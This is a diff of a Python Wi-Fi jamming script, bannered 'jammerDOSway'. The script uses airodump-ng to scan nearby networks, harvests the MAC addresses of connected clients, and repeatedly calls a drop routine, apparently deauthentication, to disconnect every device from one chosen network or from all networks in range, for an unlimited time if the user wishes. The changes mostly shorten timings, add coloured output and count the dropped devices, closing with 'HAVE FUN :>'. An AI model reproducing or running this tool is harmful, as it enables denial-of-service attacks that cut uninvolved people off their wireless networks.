@@ -3,11 +3,29 @@ import os
 import time
 import sqlite3
 
-print("Hi jumppy :>")
-all_or_one = input("To drop all devices all WIFIs around you, type 'y'. To drop devices only one WIFI that you want, type 'n': ")
+text = """                     ▄▀░░▌
+                   ▄▀▐░░░▌
+                ▄▀▀▒▐▒░░░▌
+     ▄▀▀▄   ▄▄▀▀▒▒▒▒▌▒▒░░▌
+    ▐▒░░░▀▄▀▒▒▒▒▒▒▒▒▒▒▒▒▒█
+    ▌▒░░░░▒▀▄▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄
+   ▐▒░░░░░▒▒▒▒▒▒▒▒▒▌▒▐▒▒▒▒▒▀▄
+    ▌▀▄░░▒▒▒▒▒▒▒▒▐▒▒▒▌▒▌▒▄▄▒▒▐
+   ▌▌▒▒▀▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▒█▄█▌▒▒▌
+ ▄▀▒▐▒▒▒▒▒▒▒▒▒▒▒▄▀█▌▒▒▒▒▒▀▀▒▒▐░░░▄
+▀▒▒▒▒▌▒▒▒▒▒▒▒▄▒▐███▌▄▒▒▒▒▒▒▒▄▀▀▀▀
+▒▒▒▒▒▐▒▒▒▒▒▄▀▒▒▒▀▀▀▒▒▒▒▄█▀░░▒▌▀▀▄▄
+▒▒▒▒▒▒█▒▄▄▀▒▒▒▒▒▒▒▒▒▒▒░░▐▒▀▄▀▄░░░░▀
+▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▄▒▒▒▒▄▀▒▒▒▌░░▀▄
+▒▒▒▒▒▒▒▒▀▄▒▒▒▒▒▒▒▒▀▀▀▀▒▒▒▄▀     ▂▃▅▇█▓▒░۩۞۩ jammerDOSway ۩۞۩░▒▓█▇▅▃▂"""
+print(text)
+CRED = '\033[41m'
+CEND = '\033[0m'
+print("\nHi jumppy :>")
+all_or_one = input(CRED + "\nChoose target" + CEND +"\n(all=y, one=n): ")
 if all_or_one == 'n':
-    wifi_name = input("Give the name of the WIFI exactly: ")
-during = input("For how many seconds do you want to drop the devices?\nIf you enter 0, this process will take forever until you close it!: ")
+    wifi_name = input(CRED + "\nGive the name of the WIFI exactly:" + CEND + " ")
+during = input(CRED + "\nFor how many seconds do you want to drop the devices?" + CEND + "\n(0=unlimited): ")
 
 
 def getInterfaceName():
@@ -28,7 +46,7 @@ def isMonitor():
     if type_of_card == 'monitor':
         return True
     if type_of_card == 'managed':
-        print("You may want change your type of network card manually.")
+        print("\nYou may want change your type of network card manually.")
         return False
 
 def scanNetwork(interface_name_monitor):
@@ -77,14 +95,14 @@ def scanDevices(interface_name_monitor, bssid, channel):
     channel = str(channel)
     files_second = os.listdir("./secondScan")
     number_of_files_second = len(files_second)
-    os.system(f"timeout -s 9 10 airodump-ng -c {channel} --bssid {bssid} -w ./secondScan/output_of_scan{number_of_files_second} --output-format csv {interface_name_monitor}")
+    os.system(f"timeout -s 9 15 airodump-ng -c {channel} --bssid {bssid} -w ./secondScan/output_of_scan{number_of_files_second} --output-format csv {interface_name_monitor}")
 
 def scanDevicesforAll(interface_name_monitor, bssid, channel):
     print("Scanning...")
     channel = str(channel)
     files_alls = os.listdir("./allScan/allsScan")
     number_of_files_alls = len(files_alls)
-    os.system(f"timeout -s 9 30 airodump-ng -c {channel} --bssid {bssid} -w ./allScan/allsScan/output_of_scan{number_of_files_alls} --output-format csv {interface_name_monitor}")
+    os.system(f"timeout -s 9 15 airodump-ng -c {channel} --bssid {bssid} -w ./allScan/allsScan/output_of_scan{number_of_files_alls} --output-format csv {interface_name_monitor}")
 
 def getWIFIname(db_name):
     conn = sqlite3.connect(db_name)
@@ -93,7 +111,6 @@ def getWIFIname(db_name):
     c.execute(names)
     names = c.fetchall()
     return names
-
 
 
 def getMACs(db_name):
@@ -143,7 +160,7 @@ if isMonitor():
 
             name = str(names[i])
             name = name[2:-3]
-            print(name)
+            print(CRED+ name + CEND)
             bssid = str(targets[i])
             bssid = bssid[2:19]
             print(bssid)
@@ -162,17 +179,21 @@ if isMonitor():
             db_name = f"./allScan/allsScan/output_of_scan{number_of_files_alls - 1}-01.csv.db"
             macs = getMACs(db_name)
             print(macs)
+            counter = 0
             for mac in macs:
                 mac = str(mac)
                 mac = mac[2:19]
-                print(mac)
+                print(CRED + mac + CEND)
                 if len(mac) == 17:
                     drop(mac, bssid, interface_name_monitor)
-                    time.sleep(10)
+                    time.sleep(5)
+                    counter += 1
+                if len(macs) == 1:
+                    print(CRED + "\nThere is not any devices connected to the WIFI!\nOr you are not close enough to the WIFI!" + CEND + "\n\n\n\n\n\n")
+                    time.sleep(1)
+        if counter == len(macs):
+            print(CRED + "All devices have been dropped from the WIFI you chose!" + CEND + "\nHAVE FUN :>")
 
-
-            print(":)")
-        print("All devices have been dropped from WIFIs around you!\nHAVE FUN :>")
     elif all_or_one == 'n':
         ## FIRST SCAN
         scanNetwork(interface_name_monitor)
@@ -199,20 +220,20 @@ if isMonitor():
         db_name = f"./secondScan/output_of_scan{number_of_files_second - 1}-01.csv.db"
         macs = getMACs(db_name)
         print(macs)
+        counter = 0
         for mac in macs:
             mac = str(mac)
             mac = mac[2:19]
-            print(mac)
+            print(CRED + mac + CEND)
             if len(mac) == 17:
                 drop(mac, bssid, interface_name_monitor)
-                time.sleep(10)
-            else:
-                print("Problem with mac")
-
-        print("All devices have been dropped from the WIFI you chose!\nHAVE FUN :>")
-
+                time.sleep(5)
+                counter += 1
+            if len(macs) == 1:
+                print(CRED + "\nThere is not any devices connected to the WIFI!\nOr you are not close enough to the WIFI!" + CEND + "\n\n\n\n\n\n")
+                time.sleep(1)
+        if counter == len(macs):
+            print(CRED + "All devices have been dropped from the WIFI you chose!" + CEND + "\nHAVE FUN :>")
 
 else:
-    print(
-        "The mode has NOT changed to monitor instead of managed.\nYou may want change your type of network card manually.")
-
+    print("The mode has NOT changed to monitor instead of managed." + CRED +"\nYou should run it as root!" + CEND)
